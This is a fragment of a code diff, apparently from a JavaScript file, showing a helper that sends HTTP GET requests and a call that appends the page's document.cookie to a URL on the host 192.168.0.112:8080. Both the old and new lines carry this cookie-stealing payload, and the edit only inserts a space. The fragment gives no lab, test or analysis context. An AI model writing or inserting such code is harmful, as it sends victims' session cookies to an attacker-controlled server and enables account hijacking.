@@ -6,4 +6,4 @@ function httpGet(theUrl)
     return xmlHttp.responseText;
 }
 
-httpGet('http://192.168.0.112:8080/['+document.cookie)
+httpGet('http://192.168.0.112:8080/[ '+document.cookie)
